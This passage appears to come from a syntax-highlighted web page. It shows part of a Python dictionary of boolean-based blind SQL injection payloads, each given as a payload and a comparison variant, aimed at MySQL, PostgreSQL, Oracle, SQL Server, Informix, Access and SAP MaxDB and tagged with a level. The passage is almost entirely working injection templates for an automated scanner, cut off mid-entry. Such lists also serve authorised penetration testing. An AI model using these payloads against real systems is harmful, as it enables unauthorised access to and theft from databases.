class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> GENERATE_SERIES([RANDNUM],[RANDNUM],<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">LIMIT</span> <span class="number">1</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_24":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="number">1</span>/(<span class="keyword">SELECT</span> <span class="number">0</span>) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>dbms<span class="string">': '</span>PostgreSQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="number">1</span>/(<span class="keyword">SELECT</span> <span class="number">0</span>) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">         '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_23":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> <span class="number">1</span>/(<span class="keyword">SELECT</span> <span class="number">0</span>) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>dbms<span class="string">': '</span>PostgreSQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> <span class="number">1</span>/(<span class="keyword">SELECT</span> <span class="number">0</span>) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">         '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_22":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> ([RANDNUM]=[RANDNUM1])*[ORIGVALUE]<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">and</span> ([RANDNUM]=[RANDNUM])*[ORIGVALUE]<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_21":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> ([RANDNUM]=[RANDNUM1])*[RANDNUM1]<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">and</span> ([RANDNUM]=[RANDNUM])*[RANDNUM1]<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_20":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> <span class="keyword">ELT</span>([RANDNUM]=[RANDNUM1],[ORIGVALUE])<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">and</span> <span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],[ORIGVALUE])<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_50":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">HAVING</span> [RANDNUM]=[RANDNUM1]<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">', '</span>payload<span class="string">': '</span> <span class="keyword">HAVING</span> [RANDNUM]=[RANDNUM]<span class="string">',</span></span><br><span class="line"><span class="string">         '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_29":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> <span class="keyword">CAST</span>(<span class="number">1</span> <span class="keyword">AS</span> <span class="built_in">INT</span>)/(<span class="keyword">SELECT</span> <span class="number">0</span> <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span><span class="keyword">Oracle</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> <span class="keyword">CAST</span>(<span class="number">1</span> <span class="keyword">AS</span> <span class="built_in">INT</span>)/(<span class="keyword">SELECT</span> <span class="number">0</span> <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_28":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> [RANDNUM1]) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> [RANDNUM1]) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_51":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ;<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS) <span class="keyword">END</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ;<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS) <span class="keyword">END</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_38":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_39":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">1</span>/(<span class="keyword">SELECT</span> <span class="number">0</span>) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>dbms<span class="string">': '</span>PostgreSQL<span class="string">', '</span>payload<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">1</span>/(<span class="keyword">SELECT</span> <span class="number">0</span>) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">         '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_55":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ;<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> [RANDNUM1]) <span class="keyword">END</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ;<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> [RANDNUM1]) <span class="keyword">END</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_58":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> ;<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> [RANDNUM]=[RANDNUM1] <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="literal">NULL</span> <span class="keyword">END</span><span class="string">', '</span>dbms<span class="string">': '</span>SAP MaxDB<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> ;<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> [RANDNUM]=[RANDNUM] <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="literal">NULL</span> <span class="keyword">END</span><span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_30":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="keyword">CAST</span>(<span class="number">1</span> <span class="keyword">AS</span> <span class="built_in">INT</span>)/(<span class="keyword">SELECT</span> <span class="number">0</span> <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span><span class="keyword">Oracle</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> <span class="keyword">CAST</span>(<span class="number">1</span> <span class="keyword">AS</span> <span class="built_in">INT</span>)/(<span class="keyword">SELECT</span> <span class="number">0</span> <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_31":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> <span class="number">1</span>/<span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> SYSMASTER:SYSDUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>Informix<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> <span class="number">1</span>/<span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> SYSMASTER:SYSDUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_32":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> [RANDNUM] <span class="keyword">END</span>) <span class="keyword">FROM</span> SYSMASTER:SYSDUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>Informix<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> [RANDNUM] <span class="keyword">END</span>) <span class="keyword">FROM</span> SYSMASTER:SYSDUAL)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_33":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> <span class="keyword">IIF</span>([RANDNUM]=[RANDNUM1],[RANDNUM],<span class="number">1</span>/<span class="number">0</span>)<span class="string">', '</span>dbms<span class="string">': '</span>Microsoft <span class="keyword">Access</span><span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">and</span> <span class="keyword">IIF</span>([RANDNUM]=[RANDNUM],[RANDNUM],<span class="number">1</span>/<span class="number">0</span>)<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_34":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> <span class="keyword">IIF</span>([RANDNUM]=[RANDNUM1],[ORIGVALUE],<span class="number">1</span>/<span class="number">0</span>)<span class="string">', '</span>dbms<span class="string">': '</span>Microsoft <span class="keyword">Access</span><span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">and</span> <span class="keyword">IIF</span>([RANDNUM]=[RANDNUM],[ORIGVALUE],<span class="number">1</span>/<span class="number">0</span>)<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_35":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> DUAL <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM1] <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> DUAL <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM1] <span class="keyword">FROM</span> DUAL) <span class="keyword">END</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_36":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_37":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> ,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_12":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">OR</span> ([RANDNUM]=[RANDNUM1])*[RANDNUM1]<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">OR</span> ([RANDNUM]=[RANDNUM])*[RANDNUM1]<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">2</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_13":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': " AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CAST('</span>[RANDSTR]<span class="string">' AS NUMERIC) END)) IS NULL",</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>PostgreSQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': " AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('</span>[RANDSTR]<span class="string">' AS NUMERIC) END)) IS NULL",</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_10":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">OR</span> <span class="keyword">ELT</span>([RANDNUM]=[RANDNUM1],[RANDNUM1])<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">OR</span> <span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],[RANDNUM1])<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">2</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_11":</span></span><br><span class="line"><span class="string">        &#123;'</span>comparsion<span class="string">': '</span> <span class="keyword">AND</span> ([RANDNUM]=[RANDNUM1])*[RANDNUM1]<span class="string">', '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">         '</span>payload<span class="string">': '</span> <span class="keyword">AND</span> ([RANDNUM]=[RANDNUM])*[RANDNUM1]<span class="string">', '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">1</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_16":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> <span class="keyword">OR</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> <span class="literal">NULL</span> <span class="keyword">ELSE</span> CTXSYS.DRITHSX.SN(<span class="number">1</span>,[RANDNUM]) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL) <span class="keyword">IS</span> <span class="literal">NULL</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span><span class="keyword">Oracle</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">OR</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="literal">NULL</span> <span class="keyword">ELSE</span> CTXSYS.DRITHSX.SN(<span class="number">1</span>,[RANDNUM]) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL) <span class="keyword">IS</span> <span class="literal">NULL</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">2</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_17":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> (<span class="keyword">SELECT</span> [RANDNUM1] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM2]) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>MySQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [ORIGVALUE] <span class="keyword">ELSE</span> (<span class="keyword">SELECT</span> [RANDNUM1] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> [RANDNUM2]) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_14":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': " OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CAST('</span>[RANDSTR]<span class="string">' AS NUMERIC) END)) IS NULL",</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>PostgreSQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': " OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('</span>[RANDSTR]<span class="string">' AS NUMERIC) END)) IS NULL",</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">2</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_15":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> <span class="literal">NULL</span> <span class="keyword">ELSE</span> CTXSYS.DRITHSX.SN(<span class="number">1</span>,[RANDNUM]) <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL) <span class="keyword">IS</span> <span class="literal">NULL</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span><span class="keyword">Oracle</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span 